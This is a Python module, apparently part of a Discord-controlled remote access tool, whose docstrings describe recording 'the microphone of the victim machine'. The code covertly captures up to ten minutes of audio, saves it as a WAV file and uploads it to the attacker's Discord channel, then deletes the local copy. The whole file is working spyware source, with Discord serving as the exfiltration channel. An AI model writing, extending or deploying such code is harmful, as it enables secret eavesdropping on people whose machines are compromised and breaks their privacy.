"""Record the microphone of the victim machine and upload the recording.

The audio is captured with `sounddevice` and stored as a plain WAV file, so
it can be played with any audio player. The capture is the same one the
voice stream uses, so the microphone is only opened once.
"""

import asyncio
import tempfile
import time
import wave
from pathlib import Path

import discord
import numpy as np
from discord.ext import commands
from discord.ext.commands import Context

from src.cmd.microphone import ensure_capture

# Longest recording that is accepted.
MAX_RECORDING_SECONDS = 600

# The level under which the recording counts as silence.
SILENCE_LEVEL = 1


def write_wav(path: Path, samples: np.ndarray, rate: int) -> Path:
    """Write the samples into a WAV file."""
    with wave.open(str(path), "wb") as handle:
        handle.setnchannels(1)
        handle.setsampwidth(2)
        handle.setframerate(rate)
        handle.writeframes(samples.astype(np.int16).tobytes())

    return path


async def record_microphone_command(
    ctx: Context[commands.Bot], seconds: int = 60
) -> None:
    """Record the microphone of the victim and upload the recording."""
    seconds = max(1, min(int(seconds), MAX_RECORDING_SECONDS))
    path = Path(tempfile.gettempdir()) / f"microphone_{int(time.time())}.wav"

    try:
        capture = await asyncio.to_thread(ensure_capture)
    except Exception as exc:
        print(f"Microphone error: {exc}")
        await ctx.reply(f"The microphone could not be opened: {exc}")
        return

    if not capture.start_recording():
        await ctx.reply("A recording is already running.")
        return

    await ctx.reply(
        f"Recording the microphone for {seconds} seconds "
        f"(`{capture.name}`)..."
    )

    # The capture runs in its own thread, the bot keeps answering messages.
    await asyncio.sleep(seconds)

    samples = capture.stop_recording()

    if samples.size == 0:
        await ctx.reply("The microphone did not deliver any audio.")
        return

    try:
        await asyncio.to_thread(write_wav, path, samples, capture.rate)
    except Exception as exc:
        print(f"Microphone error: {exc}")
        path.unlink(missing_ok=True)
        await ctx.reply(f"The recording could not be saved: {exc}")
        return

    level = int(np.max(np.abs(samples)))

    try:
        await ctx.send(
            "Microphone recording:",
            file=discord.File(str(path), filename="microphone.wav"),
        )
    finally:
        path.unlink(missing_ok=True)

    if level <= SILENCE_LEVEL:
        await ctx.reply(
            "The recording is silent, the microphone is muted or another "
            "program is holding it."
        )
